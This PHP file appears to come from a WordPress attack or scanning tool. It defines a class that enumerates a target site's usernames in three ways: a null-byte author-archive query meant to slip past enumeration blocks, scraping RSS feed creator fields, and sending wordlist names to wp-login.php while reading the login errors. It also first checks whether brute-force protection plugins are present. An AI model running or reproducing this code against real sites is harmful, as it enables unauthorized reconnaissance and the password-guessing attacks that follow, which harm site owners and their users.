<?php

class WPUser {

    var $url, $iterate, $threads;

    function __construct($url) {
        $this->url = $url;
        if( Config::get('iterate') ) {
            $this->iterate = Config::get('iterate');
        } else {
            $this->iterate = 10;
        }
        if( Config::get('thread') ) {
            $this->threads = Config::get('thread');
        } else {
            $this->threads = 10;
        }
    }

    function enumerate() {
        if( Config::get('feed') ) {
            return $this->feed();
        } elseif( Config::get('uwordlist') ) {
            return $this->brute();
        } else {
            return $this->author();
        }
    }

    #enumerate user from author page
    private function author() {
        $chunks = array_chunk(range(1, $this->iterate), $this->threads);
        foreach($chunks as $chunk) {
            foreach ($chunk as $id) {
                $urls[] = $this->url . '/?bypass=1&author%00=' . $id;
            }
            $respons = HTTPMultiRequest($urls, false, false, false);
            foreach ($respons as $resp) {
                if(stripos($resp, '200 ok') !== false) {
                    preg_match('#<body class="archive author author-([^\s]+)#i', $resp, $match);
                    preg_match('#/author/(.+?)/feed/#i', $resp, $match2);
                    if( isset($match[1]) ) {
                        $users[] = $match[1];
                    }
                    if( isset($match2[1]) ) {
                        $users[] = $match2[1];
                    }
                } elseif(stripos($resp, '301 moved permanently') !== false) {
                    preg_match('#/author/([^/\b"\']+)/?#i', $resp, $match);
                    if( isset($match[1]) ) {
                        $users[] = $match[1];
                    }
                }
            }
            unset($urls);
        }
        return ( isset($users) ? array_unique($users) : false );
    }

    #enumerate user from feeds
    private function feed() {
        $chunks = array_chunk(range(1, $this->iterate), $this->threads);
        foreach($chunks as $chunk) {
            foreach ($chunk as $id) {
                $urls[] = $this->url . '/?feed=rss2&paged=' . $id;
            }
            $respons = HTTPMultiRequest($urls, true, false, false);
            foreach ($respons as $resp) {
                preg_match_all('#<dc:creator><!\[CDATA\[(.+?)\]\]></dc:creator>#i', $resp, $match1);
                if( !empty($match1[1]) ) {
                    foreach ($match1[1] as $user) {
                        $users[] = $user;
                    }
                }
            }
            unset($urls);
        }
        return (isset($users) ? array_unique($users) : false);
    }

    private function brute() {
        if( Config::get('protected') ) {
            msg("[+] Checking if the site is bruteproof");
            $brute = new WPBrute($this->url);
            if( $protector = $brute->isProtected() ) {
                foreach ($protector as $plugin) {
                    msg("[-] The site is protected by ".$plugin." plugin");
                }
                return false;
            }
        }
        if( !file_exists( Config::get('uwordlist') ) ) {
            msg("[-] wordlist file does not exist");
            return false;
        }
        $array =  file(Config::get('uwordlist'), FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if( !empty($array) ) {
            msg("[+] ".count($array)." ".$str."list loaded");
        }
        $chunks = array_chunk($array, $this->threads);
        foreach ($chunks as $uchunk) {
            foreach ($uchunk as $username) {
                $urls[] = $this->url.'/wp-login.php';
                $datas[] = ['log='.urlencode($username).'&pwd=klol&wp-submit=Log+In&testcookie=1', ['Content-type: application/x-www-form-urlencoded','Cookie: wordpress_test_cookie=WP+Cookie+check']];
            }
            $responses = HTTPMultiRequest($urls, 1, $datas);
            foreach ($responses as $key => $resp) {
                if(stripos($resp, '200 ok') AND stripos($resp, 'invalid username') === false) {
                    $users[] = $uchunk[$key];
                }
            }
            unset($datas);
            unset($urls);
        }
        return (isset($users) ? array_unique($users) : false);
    }
}
